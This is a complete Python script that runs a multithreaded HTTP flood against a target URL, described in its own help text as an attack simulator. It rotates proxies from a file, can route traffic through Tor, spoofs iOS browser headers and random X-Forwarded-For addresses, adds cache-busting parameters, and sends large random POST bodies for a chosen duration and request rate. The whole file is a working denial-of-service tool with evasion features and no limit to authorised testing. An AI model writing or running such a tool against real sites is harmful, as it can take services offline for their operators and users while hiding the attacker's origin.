import requests
import threading
import time
import queue
import argparse
from concurrent.futures import ThreadPoolExecutor
import random
import string
import urllib.parse

# Load proxies from a file
def load_proxies(proxy_file_path):
    """Load proxies from a text file, one proxy per line."""
    proxies = []
    with open(proxy_file_path, 'r') as proxy_file:
        for line in proxy_file:
            line = line.strip()
            if line:
                proxies.append(line)
    return proxies

# Generate random iOS headers
def ios_headers():
    """Generate random headers mimicking an iOS device."""
    return {
        'User-Agent': f'Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(12, 15)}_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15A372 Safari/604.1',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Upgrade-Insecure-Requests': '1',
        'Referer': f'https://example.com/{random.choice(string.ascii_letters)}',
        'X-Debug-Token': ''.join(random.choices(string.ascii_letters + string.digits, k=16)),
        'X-Forwarded-For': '.'.join(str(random.randint(0, 255)) for _ in range(4)),  # Simulates random client IP addresses
        'Content-Security-Policy': "default-src 'none'; script-src 'self'; object-src 'none'; frame-src 'none'",
        'X-Request-ID': ''.join(random.choices(string.ascii_letters + string.digits, k=32))  # Custom ID to add more load
    }

# Generate a random payload of specified size
def generate_large_payload(size=10000):
    """Generate a random payload of a given size (default: 10,000 characters)."""
    return {'data': ''.join(random.choices(string.ascii_letters + string.digits, k=size))}

# Send a sequence of GET and POST requests using a proxy, with retry logic
def send_request_sequence(url, proxy_queue, proxy_health, max_retries=3, use_tor=False):
    """Send a sequence of GET and POST requests using a proxy from the queue, with retry logic and proxy health tracking."""
    proxy = None
    try:
        # Define Tor proxy if use_tor is enabled
        tor_proxy = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }

        retries = 0
        chained_proxy = None
        
        # Get a proxy from the queue that hasn't hit the retry limit
        while retries < max_retries:
            if not proxy_queue.empty():
                proxy = proxy_queue.get()
                if proxy_health[proxy]['failed_attempts'] < max_retries:
                    chained_proxy = {
                        'http': f'http://{proxy}',
                        'https': f'http://{proxy}'
                    }
                    break
                else:
                    # Put back the proxy if it's failing and exceeded retries
                    proxy_queue.put(proxy)
                    proxy = None
            else:
                break

        # If Tor is enabled, use both Tor and the selected proxy
        proxies = tor_proxy if use_tor else chained_proxy if chained_proxy else None

        # Create random query parameters for the URL to avoid caching
        query_params = {
            'cache_buster': ''.join(random.choices(string.ascii_letters + string.digits, k=10)),
            'random_param': random.randint(1, 1000000)
        }
        full_url = f"{url}?{urllib.parse.urlencode(query_params)}"

        # Send initial GET request
        response = requests.get(full_url, headers=ios_headers(), proxies=proxies, timeout=10)

        if response.status_code == 200:
            print(f"GET succeeded with status {response.status_code}. Sending POST.")
            
            # Send a POST request with a random payload
            data = generate_large_payload(size=random.randint(5000, 20000))
            post_response = requests.post(full_url, headers=ios_headers(), proxies=proxies, timeout=10, data=data)

            if post_response.status_code != 200:
                print(f"POST failed with status {post_response.status_code}. Retrying GET.")
                retry_response = requests.get(full_url, headers=ios_headers(), proxies=proxies, timeout=10)
                print(f"Retry GET status: {retry_response.status_code}")
            else:
                print(f"POST succeeded with status {post_response.status_code}.")
            
            # Reset the failure counter for this proxy since the request succeeded
            proxy_health[proxy]['failed_attempts'] = 0
        
        else:
            print(f"Initial GET failed with status {response.status_code}.")
            proxy_health[proxy]['failed_attempts'] += 1  # Increment failure counter for the proxy
            for _ in range(3):
                retry_response = requests.get(full_url, headers=ios_headers(), proxies=proxies, timeout=10)
                print(f"Retry GET status: {retry_response.status_code}")

        if response.status_code == 429:
            print("Received 429 Too Many Requests - slowing down")
            time.sleep(5)

    except requests.exceptions.Timeout:
        print(f"Timeout for Proxy {proxy}")
        if proxy:
            proxy_health[proxy]['failed_attempts'] += 1  # Increment failure count on timeout
    except requests.exceptions.RequestException as e:
        print(f"Error sending request: {e}")
        if proxy:
            proxy_health[proxy]['failed_attempts'] += 1  # Increment failure count on other request errors
    finally:
        if proxy:
            proxy_queue.put(proxy)  # Put proxy back in the queue for reuse

# Start the attack using threads and proxies
def start_attack(url, requests_per_second, num_threads, proxy_file_path, attack_duration, use_tor):
    """Start the attack with multiple threads, using proxies from the proxy file and retry logic."""
    proxies = load_proxies(proxy_file_path)
    proxy_queue = queue.Queue()
    
    # Track health of each proxy to limit retries
    proxy_health = {proxy: {'failed_attempts': 0} for proxy in proxies}

    # Populate the proxy queue
    for proxy in proxies:
        proxy_queue.put(proxy)

    # Calculate the end time for the attack based on the duration
    start_time = time.time()
    end_time = start_time + attack_duration

    # Define the worker function for each thread
    def worker():
        while time.time() < end_time:
            send_request_sequence(url, proxy_queue, proxy_health, use_tor=use_tor)
            time.sleep(1 / requests_per_second)  # Ensure the specified request rate is maintained

    # Use ThreadPoolExecutor to manage the worker threads
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        for _ in range(num_threads):
            executor.submit(worker)

    print("Attack completed")

# Parse command-line arguments to configure the attack
def parse_arguments():
    """Parse command-line arguments to configure the attack."""
    parser = argparse.ArgumentParser(description="A complex HTTPS attack simulator with iOS headers, Tor, chained proxy, and adaptive requests.")
    
    parser.add_argument('--url', type=str, required=True, help='Target URL')
    parser.add_argument('--duration', type=int, required=True, help='Duration of attack in seconds')
    parser.add_argument('--rps', type=float, required=True, help='Requests per second')
    parser.add_argument('--threads', type=int, required=True, help='Number of threads')
    parser.add_argument('--proxy-file', type=str, required=True, help='Proxy file path')
    parser.add_argument('--use-tor', action='store_true', help='Use Tor for traffic routing')

    return parser.parse_args()

# Main function to start the attack
if __name__ == "__main__":
    args = parse_arguments()
    start_attack(args.url, args.rps, args.threads, args.proxy_file, args.duration, args.use_tor)